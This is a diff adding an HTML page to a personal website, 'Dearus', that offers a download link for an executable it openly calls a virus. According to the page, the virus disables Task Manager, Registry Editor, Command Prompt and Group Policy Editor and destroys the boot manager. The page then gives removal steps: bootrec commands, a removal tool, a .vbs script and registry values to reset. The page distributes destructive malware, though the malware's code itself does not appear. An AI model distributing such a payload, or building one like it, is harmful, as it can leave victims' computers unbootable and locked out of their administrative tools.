@@ -1,0 +1,65 @@
+<!DOCTYPE html>
+<title>Dearus</title>
+<meta content="Just a small website for my projects." property="og:description" />
+<meta content="https://komas19.cf" property="og:url" />
+<meta content="https://cdn.discordapp.com/attachments/827177596407644221/1018202209764261908/unknown.png" property="og:image" />
+<meta content="#43B581" data-react-helmet="true" name="theme-color" />
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<link rel="stylesheet" href="https://komas19.cf/styles.css">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css"/>
+<script src="https://komas19.cf/javascript.js"></script>
+<body>
+  <noscript><p>Please enable JavaScript in your browser for better use of the website.</p></noscript>
+      
+  <body>
+  <br>
+<body>
+<br>its an virus that disables task manager, registry editor, command prompt and group policy editor
+<br><br>You might think its an normal virus, but it also destroys boot manager
+<br><br>Download: <strong><a href="cdn/Dearus.exe">Dearus</a></strong>
+
+<br><br><br><br><strong>Dearus Removal</strong>
+
+<br><br>Lets start by fixing the boot configuration data file missing required information.
+
+<br><br>You will need:
+<br>- An .iso file of windows/a usb drive containing an windows setup (we have an compact one <a href="compact10.html" target="_blank"><strong>here</strong></a>)
+<br>- If you don't have an usb drive containing an windows setup, get a usb drive (must be around 3-8GB minimum)
+<br>- You will also need an working computer for burning the iso file into the usb drive.
+
+<br><br>Note: If you are just removing it from a virtual machine, you just need the .iso file, you also don't need to do the next step about rufus
+
+<br><br>Ok so, install rufus from <a href="https://rufus.ie/en/#download" target="_blank"><strong>here</strong></a>, then burn the iso file into your usb drive.
+
+<br><br>Now boot into the windows setup, then do Shift + F10 (Fn + Shift + F10 if your computer contains the Fn key on the keyboard)
+
+<br><br>Do:
+<br>bootrec /fixmbr
+<br>bootrec /fixboot
+<br>bootrec /rebuildbcd
+
+<br><br>Now, it should identify the Windows Installation, do on the command prompt:
+<br>wpeutil reboot
+
+<br><br>Now it should reboot, you can now remove the usb drive from the computer.
+
+<br><br>The computer will now boot successfully, but we are not done!
+
+<br><br>NOTE: IF YOU WANT TO AUTOMATE THE PROCESS FOR FIXING REGEDIT WHILE DOING THE CHANGES FOR YOU: Download <a href="cdn/DearusRemoval-1.0.1.exe"><strong>this</strong></a>
+
+<br><br>Download this file: <a href="cdn/fixregedit.vbs"><strong>fixregedit.vbs</strong></a>
+
+<br><br>Put it in the system that is infected with Dearus, launch the .vbs then
+
+<br><br>Do Windows + R then type:
+<br>regedit
+
+<br><br>now, go to HKEY_CURRENT_USER -> Software -> Policies -> Microsoft -> Windows -> System, in the system key, you should see "DisableCMD" on the right of the window, double click it then replace 1 by 0
+
+<br><br>and go to HKEY_CURRENT_USER -> Software  -> Microsoft -> Windows -> CurrentVersion -> Policies -> System, in the system key, you should see "DisableTaskMgr" on the right of the window, double click it then replace 1 by 0 
+
+<br><br>and go to HKEY_CURRENT_USER -> Policies  -> Microsoft -> MMC -> {8FC0B734-A0E1-11D1-A7D3-0000F87571E3}, you should see "Restrict_Run" on the right of the window, double click it then replace 1 by 0 
+
+
+<br><br>You are done now! No more changes are required as these are the only changes being done!
+</html>
